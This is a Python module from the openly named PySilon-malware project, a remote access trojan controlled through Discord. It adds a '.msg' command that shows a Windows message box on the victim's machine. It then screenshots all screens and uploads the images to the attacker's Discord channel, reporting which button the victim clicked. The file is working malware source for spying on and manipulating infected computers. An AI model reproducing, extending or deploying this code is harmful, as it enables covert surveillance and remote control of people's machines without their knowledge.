from html2image import Html2Image
from PIL import Image
import ctypes
# end of imports

# on reaction add
elif str(reaction) == '✅':
    if custom_message_to_send[0] != None:
        threading.Thread(target=send_custom_message, args=(custom_message_to_send[0], custom_message_to_send[1], custom_message_to_send[2],)).start()
        await asyncio.sleep(0.5)
        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
        reaction_msg = await reaction.message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
        await reaction_msg.add_reaction('📌')
        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)

# on message
elif message.content[:4] == '.msg':
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.msg' or message.content.count('"') not in [2, 4, 6]:
        #.log Author issued empty ".show" 
        embed = discord.Embed(title="📛 Error",description='```Syntax: .msg <text=""> [title=""] [style=]\n  - default title is "From: Someone"\n  - default style is 0. Styles:\n    0 : OK\n    1 : OK | Cancel\n    2 : Abort | Retry | Ignore\n    3 : Yes | No | Cancel\n    4 : Yes | No\n    5 : Retry | Cancel\n    6 : Cancel | Try Again | Continue```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message with usage of ".show" 
    elif 'text="' in message.content:
        message_title = 'From: Someone'
        message_style = 0

        message_text = ''
        for i in message.content[message.content.find('text="')+6:]:
            if i != '"': message_text += i
            else: break
        if 'title="' in message.content[5:]:
            message_title = ''
            for i in message.content[message.content.find('title="')+7:]:
                if i != '"': message_title += i
                else: break
        if 'style=' in message.content[5:]:
            message_style = int(message.content[message.content.find('style=')+6])


        if message.content[-2:] == '/s':
            threading.Thread(target=send_custom_message, args=(message_title, message_text, message_style,)).start()
            await asyncio.sleep(0.5)
            ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
            await reaction_msg.add_reaction('📌')
            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
        else:
            hti = Html2Image()
            possible_styles = [
                '<div class="active_button">OK</div>',
                '<div class="button">Cancel</div><div class="active_button">OK</div>', 
                '<div class="button">Ignore</div><div class="button">Retry</div><div class="active_button">Abort</div>',
                '<div class="button">Cancel</div><div class="button">No</div><div class="active_button">Yes</div>',
                '<div class="button">No</div><div class="active_button">Yes</div>',
                '<div class="button">Cancel</div><div class="active_button">Retry</div>',
                '<div class="button">Continue</div><div class="button">Try Again</div><div class="active_button">Cancel</div>'
            ]
            
            hti.screenshot(
                html_str='''<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: 'Calibri';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: 'Calibri';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class="container"><div class="title">''' + message_title + '''</div><div class="close"><b>&#9587;</b></div><div class="text">''' + message_text + '''</div><div class="footer">''' + possible_styles[int(message_style)] + '''</div></div></body></html>''',
                size=(500, 300),
                save_as='image.png'
            )

            img = Image.open('image.png')
            content = img.getbbox()
            img = img.crop(content)
            img.save('image.png')

            file = discord.File('image.png', filename='image.png')
            embed = discord.Embed(title='Confirm message', description=f'Check if message preview meets your expectations:', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            embed.set_image(url='attachment://image.png')
            embed.set_footer(text='Note: you will see what button did victim click.')
            reaction_msg = await message.channel.send(file=file, embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('🔴')
            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\image.png', shell=True)
            await message.channel.send('```^ React with ✅ to send the message```')
            custom_message_to_send = [message_title, message_text, message_style]

# anywhere
def send_custom_message(title, text, style):
    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    possible_responses = [
        '',
        'OK',
        'Cancel',
        'Abort',
        'Retry',
        'Ignore',
        'Yes',
        'No',
        '',
        '',
        'Try Again',
        'Continue'
    ]
    embed = discord.Embed(title="📧 User responded!",description=f'The response for Message(title="{title}", text="{text}", style={style})\nis:```{possible_responses[int(response)]}```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    embeds_to_send.append([channel_ids['main'], embed])
